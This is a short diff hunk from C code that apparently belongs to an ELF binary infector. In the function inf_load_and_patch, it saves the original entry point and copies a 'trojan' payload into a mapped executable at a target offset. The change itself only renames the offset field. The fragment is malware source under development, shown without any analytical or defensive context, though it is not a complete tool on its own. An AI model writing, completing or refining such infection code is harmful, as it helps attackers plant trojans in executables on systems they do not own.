@@ -172,7 +172,7 @@ bool inf_load_and_patch(infect_t *inf) {
 
     /** All good! */
     *(inf->magic_ptr) = inf->pad.o_entry;
-    unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + inf->pad.lsb_so_addr;
+    unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + inf->pad.target_offset;
     memcpy(dest, inf->trojan, inf->src_bin_size);
 
     return true;
